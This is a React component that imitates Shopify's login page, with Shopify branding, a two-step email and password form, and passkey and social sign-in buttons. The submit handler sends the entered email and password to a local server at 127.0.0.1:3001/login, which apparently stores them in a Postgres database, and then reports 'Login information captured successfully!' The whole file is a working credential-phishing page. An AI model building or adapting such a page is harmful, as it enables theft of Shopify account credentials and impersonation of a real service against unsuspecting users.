import React, { useState } from 'react';
import { ShopifyLogo, AppleLogo, FacebookLogo, GoogleLogo, KeyIcon } from './Icons';

const LoginPage: React.FC = () => {
  const [step, setStep] = useState<'email' | 'password'>('email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isFocused, setIsFocused] = useState(false);
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (step === 'email') {
        if (email.trim()) {
            setStep('password');
        }
    } else {
        setIsLoading(true);
        try {
            // Trying 127.0.0.1 as it is more reliable than localhost on some systems
            const response = await fetch('http://127.0.0.1:3001/login', {
                method: 'POST',
                mode: 'cors', // Explicitly request CORS
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ email, password }),
            });

            // Check if response is JSON
            const contentType = response.headers.get("content-type");
            if (contentType && contentType.indexOf("application/json") !== -1) {
                const data = await response.json();
                if (response.ok && data.success) {
                    alert('Login information captured successfully!');
                    console.log('Saved User:', data.user);
                } else {
                    alert(data.message || 'Login failed. Check server logs.');
                }
            } else {
                // If text response (e.g. 404 or server error HTML)
                const text = await response.text();
                throw new Error(`Server response was not JSON: ${text.substring(0, 100)}`);
            }

        } catch (error) {
            console.error('Connection Error:', error);
            alert('Unable to connect to the server.\n\n1. Ensure "node server.js" is running in your terminal.\n2. Ensure your backend has installed dependencies: "npm install express pg cors".\n3. Check console for details.');
        } finally {
            setIsLoading(false);
        }
    }
  };

  const handleBack = () => {
      setStep('email');
      setPassword('');
  };

  return (
    <div className="w-full max-w-[448px] bg-white rounded-xl shadow-[0_0_0_1px_rgba(0,0,0,0.06),0_8px_24px_-4px_rgba(0,0,0,0.08)] p-8 sm:p-10 relative overflow-hidden transition-all duration-300">
      
      {/* Header Section */}
      <div className="mb-8">
        <div className="w-28 mb-6">
           <ShopifyLogo className="w-full h-auto" />
        </div>
        <h1 className="text-[24px] font-bold text-[#202223] leading-tight mb-2 tracking-tight">Log in</h1>
        <p className="text-[#6D7175] text-[15px] font-medium">Continue to Shopify</p>
      </div>

      {/* Main Login Form */}
      <form className="space-y-5" onSubmit={handleSubmit}>
        
        {step === 'email' ? (
            <>
                <div className="space-y-1.5 animate-in fade-in slide-in-from-right-4 duration-300">
                    <label 
                        htmlFor="email" 
                        className="block text-[13px] font-medium text-[#303030]"
                    >
                        Email
                    </label>
                    <div className="relative">
                        <input
                        type="email"
                        id="email"
                        value={email}
                        onFocus={() => setIsFocused(true)}
                        onBlur={() => setIsFocused(false)}
                        onChange={(e) => setEmail(e.target.value)}
                        className={`
                            w-full border rounded-lg px-3 py-2.5 text-[#202223] text-[15px] placeholder-gray-400
                            transition-all duration-200 ease-in-out
                            focus:outline-none focus:border-[#005bd3] focus:ring-2 focus:ring-[#005bd3]/20
                            ${isFocused ? 'border-[#005bd3]' : 'border-[#8a8a8a] hover:border-[#4b4b4b]'}
                        `}
                        autoComplete="email"
                        required
                        />
                    </div>
                </div>

                <div className="relative animate-in fade-in slide-in-from-right-4 duration-300 delay-75">
                    {/* Last Used Badge - Contextual styling */}
                    <div className="absolute -top-3.5 right-0 z-10 pointer-events-none">
                        <div className="bg-[#EBF9FC] text-[#006e52] text-[11px] font-bold px-2.5 py-0.5 rounded-full flex items-center border border-[#B6E3EC] shadow-sm tracking-wide uppercase">
                            Last used
                        </div>
                    </div>

                    <button
                        type="submit"
                        className="w-full bg-[#1a1a1a] hover:bg-[#303030] text-white font-semibold py-3 px-4 rounded-lg transition-all duration-200 text-[14px] shadow-sm hover:shadow active:scale-[0.99]"
                    >
                        Continue with email
                    </button>
                </div>
            </>
        ) : (
            <div className="animate-in fade-in slide-in-from-right-4 duration-300">
                {/* Email Summary Card */}
                <div className="flex items-center justify-between border border-[#e1e3e5] rounded-lg p-3 bg-gray-50 mb-5">
                    <div className="flex flex-col overflow-hidden mr-2">
                        <span className="text-[13px] text-[#6D7175] font-medium leading-tight mb-0.5">Email</span>
                        <span className="text-[14px] text-[#202223] font-medium truncate leading-tight">{email}</span>
                    </div>
                    <button 
                        type="button"
                        onClick={handleBack}
                        className="text-[#005BD3] text-[13px] font-medium hover:underline whitespace-nowrap px-1"
                    >
                        Change
                    </button>
                </div>

                <div className="space-y-1.5 mb-5">
                    <div className="flex justify-between items-center">
                        <label 
                            htmlFor="password" 
                            className="block text-[13px] font-medium text-[#303030]"
                        >
                            Password
                        </label>
                        <a href="#" className="text-[13px] text-[#005BD3] hover:underline font-medium">
                            Forgot password?
                        </a>
                    </div>
                    <div className="relative">
                        <input
                        type="password"
                        id="password"
                        value={password}
                        onFocus={() => setIsPasswordFocused(true)}
                        onBlur={() => setIsPasswordFocused(false)}
                        onChange={(e) => setPassword(e.target.value)}
                        className={`
                            w-full border rounded-lg px-3 py-2.5 text-[#202223] text-[15px] placeholder-gray-400
                            transition-all duration-200 ease-in-out
                            focus:outline-none focus:border-[#005bd3] focus:ring-2 focus:ring-[#005bd3]/20
                            ${isPasswordFocused ? 'border-[#005bd3]' : 'border-[#8a8a8a] hover:border-[#4b4b4b]'}
                        `}
                        autoComplete="current-password"
                        autoFocus
                        required
                        />
                    </div>
                </div>

                <button
                    type="submit"
                    disabled={isLoading}
                    className={`w-full bg-[#1a1a1a] hover:bg-[#303030] text-white font-semibold py-3 px-4 rounded-lg transition-all duration-200 text-[14px] shadow-sm hover:shadow active:scale-[0.99] flex justify-center items-center ${isLoading ? 'opacity-70 cursor-not-allowed' : ''}`}
                >
                    {isLoading ? (
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                    ) : (
                        'Log in'
                    )}
                </button>
            </div>
        )}
      </form>

      {/* Divider & Social - Only visible on Email Step */}
      {step === 'email' && (
        <div className="animate-in fade-in slide-in-from-right-4 duration-300 delay-100">
            <div className="relative my-8 flex items-center justify-center">
                <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-gray-200"></div>
                </div>
                <div className="relative bg-white px-3 text-xs text-[#6D7175] font-medium uppercase tracking-wide">or</div>
            </div>

            {/* Alternative Login Options */}
            <div className="space-y-3">
                {/* Passkey Button */}
                <button
                type="button"
                className="group w-full flex items-center justify-center gap-3 bg-white border border-[#d2d5d8] hover:bg-[#F7F7F7] hover:border-[#b4b4b4] text-[#202223] font-semibold py-2.5 px-4 rounded-lg transition-all duration-200 text-[14px]"
                >
                <div className="text-[#5c5f62] group-hover:text-[#202223] transition-colors">
                    <KeyIcon className="w-5 h-5" />
                </div>
                Sign in with passkey
                </button>

                {/* Social Grid */}
                <div className="grid grid-cols-3 gap-3">
                <SocialButton icon={<AppleLogo className="w-5 h-5 text-black" />} label="Apple" />
                <SocialButton icon={<FacebookLogo className="w-5 h-5 text-[#1877F2]" />} label="Facebook" />
                <SocialButton icon={<GoogleLogo className="w-5 h-5" />} label="Google" />
                </div>
            </div>

            {/* Footer / Signup Link */}
            <div className="mt-10 text-center border-t border-gray-100 pt-6">
                <div className="text-[14px] text-[#202223]">
                New to Shopify?{' '}
                <a href="#" className="text-[#005BD3] hover:text-[#004C99] font-medium inline-flex items-center group">
                    Get started 
                    <span className="ml-1 inline-block transition-transform duration-200 group-hover:translate-x-1">→</span>
                </a>
                </div>
            </div>
        </div>
      )}
    </div>
  );
};

const SocialButton: React.FC<{ icon: React.ReactNode; label: string }> = ({ icon, label }) => {
  return (
    <button
      type="button"
      aria-label={`Continue with ${label}`}
      className="flex items-center justify-center bg-white border border-[#d2d5d8] hover:bg-[#F7F7F7] hover:border-[#b4b4b4] py-2.5 rounded-lg transition-all duration-200 h-11"
    >
      {icon}
    </button>
  );
};

export default LoginPage;